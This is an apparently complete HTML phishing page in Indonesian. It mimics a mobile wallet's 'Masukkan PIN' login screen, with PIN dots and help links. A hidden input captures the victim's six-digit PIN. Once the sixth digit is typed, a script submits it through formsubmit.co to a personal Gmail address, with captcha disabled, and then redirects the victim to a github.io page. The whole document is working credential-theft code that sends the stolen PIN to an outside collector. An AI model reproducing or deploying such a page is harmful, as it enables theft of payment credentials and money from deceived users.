<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan PIN</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background-color: #ffffff;
      color: black;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }
    .header {
      background-color: #008CFF;
      color: white;
      padding: 16px;
      display: flex;
      align-items: center;
    }
    .header h1 {
      font-size: 20px;
      margin: 0 auto;
    }
    .content {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .pin-dots {
      display: flex;
      gap: 16px;
      margin: 20px 0;
    }
    .dot {
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background-color: lightgray;
    }
    .dot.filled {
      background-color: #008CFF;
    }
    .help-links {
      display: flex;
      justify-content: space-between;
      width: 80%;
      max-width: 300px;
      margin-top: 40px;
    }
    .help-links a {
      color: #008CFF;
      font-weight: bold;
      text-decoration: none;
      font-size: 14px;
    }
    input[type="password"] {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="header">
    <span>&larr;</span>
    <h1>Masuk</h1>
  </div>

  <div class="content" onclick="document.getElementById('pinInput').focus()">
    <h2 style="font-size: 18px;">Masukkan PIN</h2>

    <div class="pin-dots" id="pinDots">
      <div class="dot" id="dot1"></div>
      <div class="dot" id="dot2"></div>
      <div class="dot" id="dot3"></div>
      <div class="dot" id="dot4"></div>
      <div class="dot" id="dot5"></div>
      <div class="dot" id="dot6"></div>
    </div>

    <!-- Input PIN Tersembunyi -->
    <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
      <input type="password" id="pinInput" name="PIN" maxlength="6" inputmode="numeric" pattern="\d{6}" required />
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://b813743.github.io/Testing-/">
    </form>

    <div class="help-links">
      <a href="#">BUTUH BANTUAN?</a>
      <a href="#">LUPA PIN?</a>
    </div>
  </div>

  <script>
    const input = document.getElementById("pinInput");
    const dots = Array.from(document.querySelectorAll(".dot"));

    input.addEventListener("input", () => {
      const val = input.value;
      dots.forEach((dot, index) => {
        if (index < val.length) {
          dot.classList.add("filled");
        } else {
          dot.classList.remove("filled");
        }
      });

      // Submit otomatis jika sudah 6 digit
      if (val.length === 6) {
        input.form.submit();
      }
    });

    // Auto-focus saat halaman dibuka
    window.onload = () => {
      input.focus();
    };
  </script>
</body>
</html>
